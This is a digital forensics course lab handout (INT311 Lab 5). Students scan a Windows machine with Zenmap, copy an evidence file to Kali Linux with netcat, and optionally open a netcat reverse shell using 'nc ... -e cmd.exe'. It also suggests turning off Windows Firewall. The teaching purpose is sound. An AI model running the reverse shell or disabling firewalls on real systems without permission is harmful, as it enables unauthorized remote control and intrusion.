

## **INT311 - Basic Computer Skills for Digital Forensics – Lab 5**

### **Lab Title:**  
**Remote Evidence Acquisition and Digital Forensics Techniques**

---

### **Objective:**
This lab aims to provide students with hands-on experience in remote file acquisition, using network utilities and tools to access files on a Windows machine from a Kali Linux system. Students will learn about standard input/output/error devices and the use of tools like Zenmap and netcat for remote access and file transfers.

---

### **Part 1: Understanding Standard Input/Output/Error Devices**

1. **Standard Devices:**
   - Explain the concepts of standard input, standard output, and standard error devices in Linux.
   - Discuss how network utilities utilize these standard devices to communicate and process data.

   **Task:**
   - Write a short paragraph explaining how standard devices work in the context of command-line operations and networking.

---

### **Part 2: Setting Up Windows for Remote Access**

1. **Creating an Evidence File in Windows:**
   - On your Windows 10 machine, create a new text file named **`YourFirstLastNameEvidence.txt`**.
   - In the file, add the content: **`Hello [Your Name]!`**.

   **Task:**
   - Verify the file has been created successfully with the correct content.

2. **Restrictions on Direct Access:**
   - Note that you are not allowed to touch the Windows machine directly after creating the file. Instead, you will access it remotely from Kali Linux.

---

### **Part 3: Setting Up Kali Linux for Remote Access**

1. **Installing Necessary Tools:**
   - Ensure that **nmap** and **netcat** are installed on your Kali Linux system. If not, install them using:
     ```bash
     sudo apt update
     sudo apt install nmap netcat
     ```

2. **Using Zenmap:**
   - Open Zenmap on Kali Linux to perform a scan of the Windows machine to identify open ports and services. Input the Windows machine's IP address and scan for common ports.

   **Task:**
   - Document the scan results, focusing on any open ports related to file sharing or remote access (e.g., port 139 for SMB, port 445 for SMB over TCP).

---

### **Part 4: Establishing Remote Access**

1. **Using Netcat for Remote Access:**
   - On the Windows machine, you need to set up **netcat** to listen for incoming connections. Open a command prompt and run:
     ```cmd
     nc -l -p 12345 -w 10 < YourFirstLastNameEvidence.txt
     ```

   **Note:** Ensure that Windows Firewall allows this connection or temporarily disable it for this exercise.

2. **Connecting from Kali:**
   - On the Kali Linux machine, use netcat to connect to the Windows machine and acquire the file:
     ```bash
     nc [Windows_IP_Address] 12345 > YourFirstLastNameEvidence.txt
     ```

   **Task:**
   - After running the command, verify that **`YourFirstLastNameEvidence.txt`** has been successfully downloaded to the Kali system by checking its content:
     ```bash
     cat YourFirstLastNameEvidence.txt
     ```

---

### **Part 5: Reverse Shell Creation (Optional Advanced Task)**

1. **Establishing a Reverse Shell:**
   - For advanced users, set up a reverse shell from the Windows machine back to Kali. On Kali, listen for incoming connections:
     ```bash
     nc -l -p 12345
     ```

   - On Windows, execute the following command to create a reverse shell:
     ```cmd
     nc [Kali_IP_Address] 12345 -e cmd.exe
     ```

   **Task:**
   - Document the steps taken to establish the reverse shell and the commands you can run remotely.

---

### **Part 6: Digital Forensics and Remote Evidence Acquisition**

1. **Discussing Remote Evidence Acquisition:**
   - Define what remote evidence acquisition means in the context of digital forensics. Highlight the importance of maintaining evidence integrity and legal implications.

   **Task:**
   - Write a brief explanation (150-200 words) discussing the challenges and best practices of remote evidence acquisition.

---

### **Submission Requirements:**

- Submit a PDF document containing:
  - Screenshots of the commands executed and their outputs.
  - Summaries and explanations for each task completed.
  - Evidence of the successful file transfer and any additional notes from the reverse shell task.

- Ensure your document is well-organized, clearly labeled, and includes your name and student ID at the top.

---

### **Grading Criteria:**

- **Correctness:** Accuracy of file creation, network configurations, and command executions.
- **Clarity:** Clear explanations and documentation of the process.
- **Depth:** Thoroughness of explanations regarding remote access and digital forensics principles.
- **Documentation:** Professional presentation of findings with appropriate screenshots and organization.

---

### **Important Notes:**

- This lab emphasizes ethical considerations in digital forensics and the importance of legal compliance when accessing remote systems.
- Ensure you have permission to access and retrieve files from any remote machines used in this lab.

---

Good luck!